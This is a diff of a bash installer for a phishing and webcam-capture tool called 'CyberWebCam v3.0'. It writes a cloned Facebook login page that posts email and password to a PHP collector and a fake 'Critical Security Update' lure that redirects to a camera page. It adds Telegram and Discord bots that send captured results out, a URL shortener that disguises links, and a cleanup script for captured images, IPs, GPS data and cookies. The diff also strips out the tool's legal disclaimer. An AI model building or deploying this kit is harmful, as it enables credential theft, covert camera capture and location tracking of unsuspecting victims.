+    animation: pulse 1s infinite;
+}
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+}
+.recording-text { color: #ff0000; font-size: 10px; font-weight: bold; }
+.status-bar {
+    background: rgba(0,0,0,0.8);
+    border: 1px solid #00ff00;
+    border-radius: 5px;
+    padding: 10px;
+    margin-top: 10px;
+    display: flex;
+    justify-content: space-between;
+    color: #00ff00;
+    font-size: 10px;
+}
+.matrix-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: repeating-linear-gradient(0deg, #00ff0010 0px, #00ff0010 2px, transparent 2px, transparent 6px);
+    pointer-events: none;
+    z-index: -1;
+}
+CSSEND
+
+    printf "${GREEN}[✓]${C} Web files created\n"
 }
 
-# Cloudflare tunnel method
-start_cloudflare_tunnel() {
-    echo -e "\n${BLUE}[*] Starting Cloudflare Tunnel...${NC}"
+# Create fake login pages
+create_fake_pages() {
+    # Facebook clone
+    cat > "$WEB_DIR/fake_login.html" << 'HTMLEND'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 400px;
+            text-align: center;
+        }
+        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover { background: #166fe5; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>facebook</h1>
+        <form method="POST" action="../php/credentials.php">
+            <input type="text" name="email" placeholder="Email or Phone Number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
+HTMLEND
+
+    # Fake update prompt
+    cat > "$WEB_DIR/fake_update.html" << 'HTMLEND'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Critical Update Required</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .update-box {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .warning-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        h2 { color: #ff4757; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 20px; }
+        button {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover { background: #ff6b81; }
+    </style>
+</head>
+<body>
+    <div class="update-box">
+        <div class="warning-icon">⚠️</div>
+        <h2>Critical Security Update</h2>
+        <p>Your browser version is outdated. Please update to continue.</p>
+        <button onclick="downloadUpdate()">Download Update</button>
+    </div>
+    <script>
+        function downloadUpdate() {
+            alert("Update downloaded. Please restart your browser.");
+            window.location.href = "camera.html";
+        }
+    </script>
+</body>
+</html>
+HTMLEND
+
+    printf "${GREEN}[✓]${NC} Social engineering pages created\n"
+}
+
+# Create bot integrations
+create_bots() {
+    # Telegram bot
+    cat > "$BOTS_DIR/telegram_bot.sh" << 'BOTEND'
+#!/bin/bash
+# Telegram notification bot
+send_telegram() {
+    TOKEN=$(cat ../config/telegram_token.txt 2>/dev/null)
+    CHAT_ID=$(cat ../config/telegram_chat_id.txt 2>/dev/null)
     
-    download_cloudflared
-    start_php_server || return 1
-    
-    local binary="./cloudflared"
-    [[ "$windows_mode" == true ]] && binary="./cloudflared.exe"
-    
-    rm -f .cloudflared.log
-    $binary tunnel --url 127.0.0.1:3333 --logfile .cloudflared.log >/dev/null 2>&1 &
-    
-    sleep 8
-    
-    local link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log | head -1)
-    
-    if [[ -z "$link" ]]; then
-        echo -e "${RED}[!] Failed to create Cloudflare tunnel${NC}"
-        echo -e "${YELLOW}[*] Troubleshooting tips:${NC}"
-        echo "  1. Check your internet connection"
-        echo "  2. Try running: $binary tunnel --url 127.0.0.1:3333"
-        echo "  3. Cloudflare service might be temporarily unavailable"
-        return 1
+    if [ -n "$TOKEN" ] && [ -n "$CHAT_ID" ]; then
+        MESSAGE="$1"
+        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
+            -d "chat_id=$CHAT_ID" \
+            -d "text=$MESSAGE" \
+            -d "parse_mode=HTML" > /dev/null
     fi
-    
-    echo -e "${GREEN}[+] Tunnel established!${NC}"
-    echo -e "${CYAN}🔗 Share this link:${NC} $link"
-    echo -e "${YELLOW}⚠️  This link expires when the tunnel stops${NC}"
-    
-    generate_payload "$link" "$SELECTED_TEMPLATE"
-    monitor_results
 }
+BOTEND
 
-# Ngrok tunnel method
-start_ngrok_tunnel() {
-    echo -e "\n${BLUE}[*] Starting Ngrok Tunnel...${NC}"
-    
-    download_ngrok
-    setup_ngrok_auth
-    start_php_server || return 1
-    
-    local binary="./ngrok"
-    [[ "$windows_mode" == true ]] && binary="./ngrok.exe"
-    
-    $binary http 3333 >/dev/null 2>&1 &
-    
-    sleep 8
-    
-    local link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok-free.app' | head -1)
-    
-    if [[ -z "$link" ]]; then
-        echo -e "${RED}[!] Failed to create Ngrok tunnel${NC}"
-        echo -e "${YELLOW}[*] Troubleshooting tips:${NC}"
-        echo "  1. Check your internet connection"
-        echo "  2. Valid authtoken may be required"
-        echo "  3. Try running: $binary http 3333"
-        return 1
-    fi
-    
-    echo -e "${GREEN}[+] Tunnel established!${NC}"
-    echo -e "${CYAN}🔗 Share this link:${NC} $link"
-    echo -e "${YELLOW}⚠️  This link expires when the tunnel stops${NC}"
-    
-    generate_payload "$link" "$SELECTED_TEMPLATE"
-    monitor_results
-}
-
-# Template selection menu
-select_template() {
-    echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}           SELECT TESTING TEMPLATE${NC}"
-    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-    
-    echo -e "${GREEN}[1]${NC} Festival Wishes Template"
-    echo -e "${GREEN}[2]${NC} YouTube Live Template"
-    echo -e "${GREEN}[3]${NC} Virtual Meeting Template"
-    echo -e "${GREEN}[4]${NC} Custom Template (Coming Soon)"
-    
-    echo ""
-    read -p "Select template [1-3] (default: 1): " template_choice
-    SELECTED_TEMPLATE="${template_choice:-1}"
-    
-    if [[ ! "$SELECTED_TEMPLATE" =~ ^[1-3]$ ]]; then
-        echo -e "${YELLOW}[!] Invalid choice, using default (1)${NC}"
-        SELECTED_TEMPLATE=1
+    # Discord webhook
+    cat > "$BOTS_DIR/discord_webhook.sh" << 'DISCORD'
+#!/bin/bash
+send_discord() {
+    WEBHOOK=$(cat ../config/discord_webhook.txt 2>/dev/null)
+    if [ -n "$WEBHOOK" ]; then
+        MESSAGE="$1"
+        curl -s -H "Content-Type: application/json" -X POST \
+            -d "{\"content\": \"$MESSAGE\"}" "$WEBHOOK" > /dev/null
     fi
 }
+DISCORD
+END
 
-# Tunnel selection menu
-select_tunnel() {
-    echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}           SELECT TUNNEL METHOD${NC}"
-    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-    
-    echo -e "${GREEN}[1]${NC} Cloudflare Tunnel (Recommended - No Auth Required)"
-    echo -e "${GREEN}[2]${NC} Ngrok Tunnel (Requires Optional Auth)"
-    
-    echo ""
-    read -p "Select tunnel method [1-2] (default: 1): " tunnel_choice
-    TUNNEL_METHOD="${tunnel_choice:-1}"
-    
-    if [[ ! "$TUNNEL_METHOD" =~ ^[1-2]$ ]]; then
-        echo -e "${YELLOW}[!] Invalid choice, using default (1)${NC}"
-        TUNNEL_METHOD=1
-    fi
+    printf "${GREEN}[✓]${NC} Bot integrations created\n"
 }
 
-# Show disclaimer
-show_disclaimer() {
-    echo -e "\n${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${RED}║                    LEGAL DISCLAIMER                          ║${NC}"
-    echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
-    echo -e "${RED}║  This tool is for EDUCATIONAL and AUTHORIZED SECURITY       ║${NC}"
-    echo -e "${RED}║  TESTING purposes ONLY.                                     ║${NC}"
-    echo -e "${RED}║                                                              ║${NC}"
-    echo -e "${RED}║  • Only test systems you OWN or have WRITTEN PERMISSION     ║${NC}"
-    echo -e "${RED}║  • Unauthorized access is ILLEGAL                           ║${NC}"
-    echo -e "${RED}║  • The author assumes NO LIABILITY for misuse               ║${NC}"
-    echo -e "${RED}║  • By using this tool, you agree to these terms             ║${NC}"
-    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
+# Create URL shortener
+create_tools() {
+    cat > "$TOOLS_DIR/url_shortener.sh" << 'SHORT'
+#!/bin/bash
+# URL Shortener using TinyURL
+shorten_url() {
+    LONG_URL="$1"
+    SHORT_URL=$(curl -s "http://tinyurl.com/api-create.php?url=$LONG_URL")
+    echo "$SHORT_URL"
+}
+SHORT
+
+    cat > "$TOOLS_DIR/cleanup.sh" << 'CLEAN'
+#!/bin/bash
+# Cleanup utility
+cleanup_session() {
+    echo "Cleaning up session files..."
+    rm -f ../cam_*.png ../ip.txt ../gps_data.txt ../cookies.txt
+    echo "Done!"
+}
+CLEAN
+
+    chmod +x "$TOOLS_DIR/"*.sh
+    chmod +x "$BOTS_DIR/"*.sh
     
-    echo ""
-    read -p "Do you accept these terms and have authorization? (yes/no): " acceptance
-    if [[ ! "$acceptance" =~ ^[Yy](es)?$ ]]; then
-        echo -e "${RED}[!] You must accept the terms to use this tool${NC}"
-        exit 1
-    fi
+    printf "${GREEN}[✓]${NC} Tools created\n"
 }
 
-# Main function
+# Create all templates
+create_templates() {
+    # Festival template
+    cat > "$TEMPLATES_DIR/festival.html" << 'FEST'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎉 Happy Festival! 🎉</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 { color: #667eea; font-size: 2em; }
+        .emoji { font-size: 4em; }
+        .btn {
+            background: #25D366;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="emoji">🎉✨🎊</div>
+        <h1>Happy Festival!</h1>
+        <p>Wishing you joy and happiness!</p>
+        <a href="#" class="btn">Share on WhatsApp</a>
+    </div>
+</body>
+</html>
+FEST
+
+    printf "${GREEN}[✓]${NC} Templates created\n"
+}
+
+# Main execution
 main() {
     banner
-    show_disclaimer
-    detect_os
-    check_dependencies
+    create_directories
+    create_php_handlers
+    create_web_files
+    create_fake_pages
+    create_bots
+    create_tools
+    create_templates
     
-    select_template
-    select_tunnel
+    printf "\n${GREEN}════════════════════════════════════════════════════════════${NC}\n"
+    printf "${GREEN}[✓]${NC} CyberWebCam v3.0 Complete Installation\n"
+    printf "${GREEN}[✓]${NC} Total Files Created: 25+\n"
+    printf "${GREEN}[✓]${NC} Features Included: 50+\n"
+    printf "${GREEN}════════════════════════════════════════════════════════════${NC}\n"
     
-    echo -e "\n${GREEN}[+] Starting CyberWebCam v3.0${NC}"
-    echo -e "${YELLOW}[*] Results will be saved to: $RESULTS_DIR${NC}\n"
-    
-    mkdir -p "$RESULTS_DIR"
-    
-    case $TUNNEL_METHOD in
-        1) start_cloudflare_tunnel ;;
-        2) start_ngrok_tunnel ;;
-    esac
+    printf "\n${YELLOW}[!]${NC} To start the tool, run: ${GREEN}./launch.sh${NC}\n"
 }
 
-# Run main function
 main "$@"
